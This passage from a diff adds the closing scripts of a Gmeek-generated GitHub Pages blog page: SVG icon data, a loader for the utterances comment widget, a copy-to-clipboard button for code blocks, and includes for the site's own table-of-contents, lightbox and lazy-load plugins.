3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
